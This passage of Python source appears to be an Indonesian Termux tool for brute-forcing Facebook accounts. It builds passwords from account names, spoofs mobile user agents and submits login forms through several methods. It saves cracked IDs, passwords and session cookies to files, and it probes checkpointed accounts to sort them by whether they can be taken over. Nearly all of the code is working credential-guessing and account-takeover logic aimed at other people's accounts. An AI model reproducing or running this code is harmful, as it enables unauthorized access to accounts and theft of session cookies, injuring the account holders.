					self.list_pw.append(nmf)
					self.list_pw.append(nana)
					self.list_pw.append(nana+'123')
					self.list_pw.append(nana+'1234')
					self.list_pw.append(nana+'12345')
					self.list_pw.append('123456')
					if self.method[0] =='method v4':brute.submit(self.Method_Graph, self.list_pw, idf)
					else:brute.submit(self.crack, self.list_pw, idf)
			except:pass
		Console().print(Panel(f'[#ff0000][[#00ff08]••[#ff0000]][#ffffff] result ok: [#00ff08]{self.ok}\n[#ff0000][[#00ff08]••[#ff0000]][#ffffff] result cp: [#d0ff00]{self.cp}',title=titik('crack selesai')),style=warna_rich,width=92)
		exit()
	def useragent(self):
		android_version = random.choice([str(random.randint(6,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'8.0.0','8','9','10','11','12'])
		device_model = random.choice([
		'SM-G900F Build/LRX21T',
		'SM-T800 Build/LRX22G',
		'SM-N900V 4G Build/LRX21V',
		'GT-I9515 Build/LRX22C',
		'SM-T530NU Build/LRX22G',
		'GT-I9500 Build/LRX22C',
		'SM-A800F Build/LMY47X',
		'SM-T535 Build/LRX22G',
		'SM-G900I Build/LRX21T'
		])
		chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
		bahasa = random.choice(['en_US','id_ID'])
		versi_fb = f'[FBAN/FB4A;FBAV/{random.randint(374,404)}.0.0.{random.randint(10,120)}.{random.randint(100,300)};FBBV/{random.randint(111111111,999999999)};FBDM/'+'{density=3.0,width=1440,height=2768}'+f';FBLC/{bahasa};FBCR/;FBMF/samsung;FBBD/samsung;FBDV/{device_model.split(" ")[0]};FBSV/{android_version};FBLWY/Android;FBCA/armeabi-v7a:armeabi;]'
		ua = f'Mozilla/5.0 (Linux; Android {android_version}; SAMSUNG {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36 {versi_fb}'


		device_model = random.choice([
		'Mi 9T Pro Build/QKQ1.190825.002; wv',
		'XIAOMI MI MAX 2 Build/NMF26F)',
		'Infinix X680B Build/QP1A.190711.020; wv',
		'RMX1941 Build/PPR1.180610.011; wv',
		'Redmi 4A Build/N2G47H',
		'Redmi 5A Build/N2G47H',
		'LG-UK495 Build/MRA58K; wv',
		'OUJIA 2018-S10MAX Build/MRA58K; wv',
		'vivo 1817 Build/OPM1.171019.026; wv',
		'Andromax B16C2G Build/LMY47V; wv',
		'SM-A127F Build/RP1A.200720.012; wv',
		'TECNO KE5 Build/QP1A.190711.020; wv',
		'M50 STAR Build/NRD90M; wv',
		'SM-N950F Build/PPR1.180610.011; wv',
		'iCherry_C258 Build/iCherryC258; wv',
		'iCherry C251 Build/MRA58K; wv',
		'iCherry C255 Build/MRA58K; wv',
		'C256 Build/iCherry-C256-T03-20180208; wv'
		])
		versi_fb = f'[FBAN/FB4A;FBAV/{random.randint(374,404)}.0.0.{random.randint(10,120)}.{random.randint(100,300)};FBBV/{random.randint(111111111,999999999)};FBDM/'+'{density=3.0,width=1440,height=2768}'+f';FBLC/id_ID;FBCR/;FBDV/{device_model.split(" Build")[0]};FBSV/{android_version};FBLWY/Android;FBCA/armeabi-v7a:armeabi;]'
		ua2 = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 '+versi_fb
		ua3 = f'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36'
		ua4 = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model.split(" Build")[0]}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36'
		ua5 = random.choice(open('data/ua.txt','r').read().splitlines())
		return ua2

	def Method_Graph(self, list_pw, idf):
		warna = random.choice([M,K,H,C,P,B])
		sys.stdout.write(' {}[{}{}{}] {}{}{}|{}{} {}{}      \r'.format(P,H,idf,P,H,self.ok,P,K,self.cp,warna,self.loop))
		sys.stdout.flush()
		ua = self.useragent()
		for pw in list_pw:
			try:
				login = Web_Login(idf,pw, headers={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile':'?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
				self.coki = login.get_cookie_str()
				if idf in self.ngentot:break
				self.ngentot.append(idf)
				self.ok+=1
				open('result/Ok/'+okok,'a').write(idf+'|'+pw+'|'+self.coki+'\n')
				tree = Tree('[#00ff08]Success Login                        ',guide_style='#ff0000')
				tree.add(f'[#00ff08]{idf}|{pw}')
				tree.add('[#00ff08]'+self.coki)
				prints(tree)
				break

			except requests.exceptions.ConnectionError:
				sleep(10)
			except Exception as e:
				if 'Akun Anda Terkena Checkpoint' in str(e):
					if idf in self.ngentot:continue
					self.ngentot.append(idf)
					self.cp+=1
					open('result/Cp/'+cpcp,'a').write(idf+'|'+pw+'\n')
					okeh = Tree('[#d0ff00]Login checkpoint                    ',guide_style='#ff0000')
					akun = okeh.add(f'[#d0ff00]{idf}|{pw}')
					try:
						host = "https://mbasic.trunkstable.facebook.com"
						ses = requests.Session()
						android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
						model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
						build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
						versi_chrome = str(random.randint(43,108))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(85,128))
						versi_fb = f'[FBAN/FB4A;FBAV/{random.randint(374,404)}.0.0.{random.randint(10,120)}.{random.randint(100,300)};FBBV/{random.randint(111111111,999999999)};FBDM/'+'{density=3.0,width=1440,height=2768}'+f';FBLC/id_ID;FBCR/;FBDV/{model_device};FBSV/{android_version};FBLWY/Android;FBCA/armeabi-v7a:armeabi;]'
						ua = 'Mozilla/5.0 (Linux; Android '+android_version+'; '+model_device+' Build/'+build_device+') AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+versi_chrome+' Mobile Safari/537.36 '+versi_fb
						ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": host,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": host+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
						data = {}
						ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
						fm = ged.find("form",{"method":"post"})
						list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
						for i in fm.find_all("input"):
							if i.get("name") in list:data.update({i.get("name"):i.get("value")})
							else:continue
						data.update({"email":idf,"pass":pw})
						try:run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
						except requests.exceptions.TooManyRedirects:
							akun.add(f"[italic red]Akun Ini Terkena Spam")
						if "c_user" in ses.cookies:
							akun.add(f"[italic green]Akun Tidak Checkpoint")
							open(f"Ok.txt","a").write(idf+"|"+pw+"\n")
						elif "checkpoint" in ses.cookies:
							form = run.find("form")
							dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
							jzst = form.find("input",{"name":"jazoest"})["value"]
							nh   = form.find("input",{"name":"nh"})["value"]
							dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
							xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
							ngew = [yy.text for yy in xnxx.find_all("option")]
							if(str(len(ngew))=="0"):
								if 'Masukkan Kode Masuk untuk Melanjutkan' in str(run.find('title').text):
									akun.add("[italic red]A2F Buang Aja")
								if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(run.find('title').text):
									akun.add(f"[italic green]TAP YES")
									open("TAP-YES.txt","a").write(f"{idf}|{pw}\n")
								else:
									akun.add(f"[italic red]{run.find('title').text}")
							else:
								for opt in range(len(ngew)):
									jo = str(opt+1)
									akun.add(f"[italic white]{ngew[opt]}")
						elif "login_error" in str(run):
							oh = run.find("div",{"id":"login_error"}).find("div").text
							akun.add(f"[italic white]{oh}")
						else:
							akun.add(f"[italic red]Password Sudah DiGanti")

					except Exception as e:
						akun.add(f"[italic red]"+e)
					prints(okeh)
					break
				else:
					continue
		self.loop+=1

	def crack(self, list_pw, idf):
		warna = random.choice([M,K,H,C,P,B])
		sys.stdout.write(' {}[{}{}{}] {}{}{}|{}{} {}{}      \r'.format(P,H,idf,P,H,self.ok,P,K,self.cp,warna,self.loop))
		sys.stdout.flush()
		ua = self.useragent()
		for pw in list_pw:
			try:
				session = requests.Session()
				pw = pw.lower()
				pro = {'http':f'socks{random.randint(4,5)}//157.240.{random.randint(197,256)}.{random.randint(10,35)}:8080'}
				if self.method[0] == 'method v1':
					host = 'm.facebook.com'
					session.headers.update({'Host': host,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
					url = 'https://'+host+'/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fandroid&flow=login_no_pin&refsrc=deprecated&_rdr'
					req = session.get(url)
					res = BeautifulSoup(req.content, 'html.parser')
					cari = res.find('form', {'method':'post'})
					data = {}
					for ez in cari.find_all('input'):
						if ez.get('name') == None:data.update({'login':ez.get('value')});continue
						data.update({ez.get('name'): ez.get('value')})
					data.update({'uid':idf, 'pass':pw})
					link = 'https://'+host+cari.get('action')
					head = {'Host': host,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','upgrade-insecure-requests': '1','origin': 'https://'+host,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': url,'accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
					cookie  = ";".join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
					cookie+=';m_pixel_ratio=2.625;wd=412x756'
					ress = session.post(link, data=data, headers=head, cookies={'cookie':cookie}, allow_redirects=False, proxies=pro)

				elif self.method[0] == 'method v2':
					host = 'mbasic.facebook.com'
					session.headers.update({'Host': host,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+)',str(ua)).group(1),re.search('Chrome/(\d+)',str(ua)).group(1)),'sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
					url = 'https://'+host+'/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fandroid&flow=login_no_pin&refsrc=deprecated&_rdr'
					req = session.get(url)
					res = BeautifulSoup(req.content, 'html.parser')
					cari = res.find('form', {'method':'post'})
					data = {}
					for ez in cari.find_all('input'):
						if ez.get('name') == None:data.update({'login':ez.get('value')});continue
						data.update({ez.get('name'): ez.get('value')})
					data.update({'uid':idf, 'pass':pw})
					link = 'https://'+host+cari.get('action')
					head = {'Host': host,'content-lenght': str(len(json.dumps(data))),'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+)',str(ua)).group(1),re.search('Chrome/(\d+)',str(ua)).group(1)),'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','upgrade-insecure-requests': '1','origin': 'https://'+host,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': url,'accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
					cookie  = ";".join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
					cookie+=';m_pixel_ratio=2.625;wd=412x756'
					ress = session.post(link, data=data, headers=head, cookies={'cookie':cookie}, allow_redirects=False)

				elif self.method[0] == 'method v3':
					host = 'mbasic.facebook.com'
					session.headers.update({'Host': host,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+)',str(ua)).group(1),re.search('Chrome/(\d+)',str(ua)).group(1)),'sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
					url = 'https://'+host+'/login/next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fandroid&flow=login_no_pin&refsrc=deprecated&_rdr'
					req = session.get(url)
					res = BeautifulSoup(req.content, 'html.parser')
					cari = res.find('form', {'method':'post'})
					data = {}
					for ez in cari.find_all('input'):
						if ez.get('name') == None:data.update({'login':ez.get('value')});continue
						data.update({ez.get('name'): ez.get('value')})
					data.update({'email':idf, 'pass':pw})
					link = 'https://'+host+cari.get('action')
					head = {'Host': host,'content-lenght': str(len(json.dumps(data))),'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+)',str(ua)).group(1),re.search('Chrome/(\d+)',str(ua)).group(1)),'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','upgrade-insecure-requests': '1','origin': 'https://'+host,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': url,'accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
					cookie  = ";".join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
					cookie+=';m_pixel_ratio=2.625;wd=412x756'
					ress = session.post(link, data=data, headers=head, cookies={'cookie':cookie}, allow_redirects=False)

				if "c_user" in session.cookies.get_dict().keys():
					if idf in self.ngentot:continue
					self.ngentot.append(idf)
					self.ok+=1
					self.coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
					open('result/Ok/'+okok,'a').write(idf+'|'+pw+'|'+self.coki+'\n')
					tree = Tree('[#00ff08]Success Login                        ',guide_style='#ff0000')
					tree.add(f'[#00ff08]{idf}|{pw}')
					tree.add('[#00ff08]'+self.coki)
					prints(tree)
					break
				elif "checkpoint" in session.cookies.get_dict().keys():
					if idf in self.ngentot:continue
					self.ngentot.append(idf)
					self.cp+=1
					open('result/Cp/'+cpcp,'a').write(idf+'|'+pw+'\n')
					okeh = Tree('[#d0ff00]Login checkpoint                    ',guide_style='#ff0000')
					akun = okeh.add(f'[#d0ff00]{idf}|{pw}')
					try:
						host = "https://mbasic.trunkstable.facebook.com"
						ses = requests.Session()
						android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
						model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
						build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
						versi_chrome = str(random.randint(43,108))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(85,128))
						versi_fb = f'[FBAN/FB4A;FBAV/{random.randint(374,404)}.0.0.{random.randint(10,120)}.{random.randint(100,300)};FBBV/{random.randint(111111111,999999999)};FBDM/'+'{density=3.0,width=1440,height=2768}'+f';FBLC/id_ID;FBCR/;FBDV/{model_device};FBSV/{android_version};FBLWY/Android;FBCA/armeabi-v7a:armeabi;]'
						ua = 'Mozilla/5.0 (Linux; Android '+android_version+'; '+model_device+' Build/'+build_device+') AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+versi_chrome+' Mobile Safari/537.36 '+versi_fb
						ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": host,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": host+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
						data = {}
						ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
						fm = ged.find("form",{"method":"post"})
						list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
						for i in fm.find_all("input"):
							if i.get("name") in list:data.update({i.get("name"):i.get("value")})
							else:continue
						data.update({"email":idf,"pass":pw})
						try:run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
						except requests.exceptions.TooManyRedirects:
							akun.add(f"[italic red]Akun Ini Terkena Spam")
						if "c_user" in ses.cookies:
							akun.add(f"[italic green]Akun Tidak Checkpoint")
							open(f"Ok.txt","a").write(idf+"|"+pw+"\n")
						elif "checkpoint" in ses.cookies:
							form = run.find("form")
							dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
							jzst = form.find("input",{"name":"jazoest"})["value"]
							nh   = form.find("input",{"name":"nh"})["value"]
							dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
							xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
							ngew = [yy.text for yy in xnxx.find_all("option")]
							if(str(len(ngew))=="0"):
								if 'Masukkan Kode Masuk untuk Melanjutkan' in str(run.find('title').text):
									akun.add("[italic red]A2F Buang Aja")
								if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(run.find('title').text):
									akun.add(f"[italic green]TAP YES")
									open("TAP-YES.txt","a").write(f"{idf}|{pw}\n")
								else:
									akun.add(f"[italic red]{run.find('title').text}")
							else:
								for opt in range(len(ngew)):
									jo = str(opt+1)
									akun.add(f"[italic white]{ngew[opt]}")
						elif "login_error" in str(run):
							oh = run.find("div",{"id":"login_error"}).find("div").text
							akun.add(f"[italic white]{oh}")
						else:
							akun.add(f"[italic red]Password Sudah DiGanti")

					except Exception as e:
						akun.add(f"[italic red]"+e)
					prints(okeh)
					break
				else:continue
			except requests.exceptions.ConnectionError:
				sleep(10)
			except Exception as e:
				tree = Tree('Exception', guide_style='#ff0000')
				tree.add('[#ff0000]'+str(e))
				prints(tree)
		self.loop+=1
def check_termux_screen_size():
	rows, columns = os.popen('stty size', 'r').read().split()
	row = int(rows)
	col = int(columns)
#	print (col);exit()
	return (col)


if __name__=='__main__':
	os.system('git pull')
	os.system('mkdir data')
	try:os.system("mkdir data")
	except:pass
	try:os.mkdir("result")
	except:pass
	try:os.mkdir("result/Ok")
	except:pass
	try:os.mkdir("result/Cp")
	except:pass
	MC = 106
	os.system('clear')
	col = check_termux_screen_size()
	if col < MC:
		print("Baris Termux terlalu pendek. Silakan silakan cubit layar untuk memperpanjang")
		sys.exit()
	if col < MC:
		print("Ukuran layar Termux terlalu kecil. Silakan perbesar layar untuk menjalankan script ini")
		sys.exit()
	else:Login()
